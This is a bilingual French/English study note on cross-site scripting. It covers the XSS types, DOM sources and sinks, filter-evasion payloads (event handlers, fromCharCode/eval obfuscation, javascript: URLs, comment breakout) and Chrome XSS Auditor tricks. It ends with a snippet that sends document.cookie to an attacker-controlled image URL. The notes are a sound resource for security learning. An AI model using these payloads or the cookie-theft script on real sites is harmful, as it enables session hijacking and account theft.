# XSS - Cross-Site Scripting

## Types

### Reflected

L'input de l'utilisateur est envoyé au serveur puis réfléchis sur la page.

### Stored

Pareil sauf que l'input est en plus persisté.

### DOM

L'input est directement inséré dans le DOM \(donc sans passer par le serveur\).

#### Sources \(where the input goes\)

* document.url
* document.referrer
* location
* location.href
* location.search
* location.hash
* location.pathname
* ...

#### Sinks \(where the input ends up\)

* element.innerHTML\(\)
* element.outerHTML\(\)
* eval\(\)
* setTimeout\(\)
* setInterval\(\)
* document.write\(\)
* document.writeln\(\)
* ...

#### Tips & Tricks

Un tag `<script>alert();</script>` inséré via `inner.html` ne sera en fait pas executé. 

Vaut mieux passer par un `<img src="test" onerror="alert(1337)" />`, ou encore plus simple : `<svg onload="alert(1337)">`

### Polygots

XSS payloads made from a mixture of encoding/repetition/comments/etc that make it possible to pass filter/black list/etc. They're hard to read.

### Tips

* Start by checking which characters are escaped by using them with a normal string that you can easily find in the result. Also use lists with _burp intruder_.
* Si les `<script>` ne sont pas accepté, utiliser les événements de type `onfocus`, `onload`, etc. Btw you can accumulate function in these event by separating them with `;`.
* `<sCRipt>` tag aren't case sensitive
* If the string tag is accepted but not word like "alert", you can do things like :
  * `eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))`
  * `eval("al"+"ert(1)")`
* Avec le http parameter pollution, s’il est concaténé, on peut aussi faire du xss
* C'est aussi possible de passer par du HTML5/CSS3/SVG
* [https://www.owasp.org/index.php/XSS\_Filter\_Evasion\_Cheat\_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
* `javascript:alert(1337)` as url \(form action for example\)
* `data:text/html,<script>alert(0)</script>` in url
* Avec ce code

  ```javascript
  let name = (new URL(location).searchParams.get('name'))
  eval(`var = "bonjour ${name}"`)
  ```

On peut lui donner ce payload : `name="-alert(1337)-"` Mais j'ignore pourquoi les "-" font que ça marche, du coup ce que j'ai fait moi pour pas avoir d'erreur c'est : `name=";alert(1337);tmp="`

* Pour créer une string sans utiliser "" y'a 2 techniques :
  * eval du regex : `eval(/alert(1337)/.source())`
  * tostring un nombre avec une base : `17795081..toString(36)` \(j'ignore pourquoi le second `.` est obligatoire\)
* Break out of html comment : Si `<?php>` \(ou `<?>` car c'est son raccourci\) sont présent dans la réponse html, les navigateurs vont transformer ça en `<!--php-->` car ils ne veulent pas que du code serveur se retrouve accidentellement sur le client. Hors, les commentaires imbriqués n'existant pas en html, si on fait ça à l'intérieur d'un commentaire, ça va le terminer prématurément.
* https can be in all caps \(HTTPS\)
* `google.com/jsapi?callback=alert` can be used to received a function in a callback

## XSS Auditor

* Il existe sur Chrome, pas sur firefox et je sais pas pour les autres
* Il risque de bientôt disparaître car il amène des vulnérabilités et permet aux devs de moins faire attention/moins corriger leurs failles XSS
* L’auditeur permet de remarquer des injections XSS. Pour cela, il compare ce qui est passé dans l’url aux scripts de la page \(très gros résumé\).
* Du coup, si on injecte le même script qu’un existant déjà dans la page, l’auditeur va le disable, pensant qu’il vient de nous, ce qui peut nous permettre d’ensuite faire d’autre choses

## Get a cookie with that

By example by injection this script :

```javascript
<script>
    document.write("<img src='...'?c="+document.cookie+"'/>");
</script>
```

The img will be added to the page and request it's source \(the attacker website\) with the cookie attached to it.

## Source

* [Owasp testing guide v4](https://owasp.org/www-project-web-security-testing-guide/assets/archive/OWASP_Testing_Guide_v4.pdf)
* PwnFunction [video](https://www.youtube.com/watch?v=EoaDgUgS6QA)
* [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)'s multiple videos
* Misc research

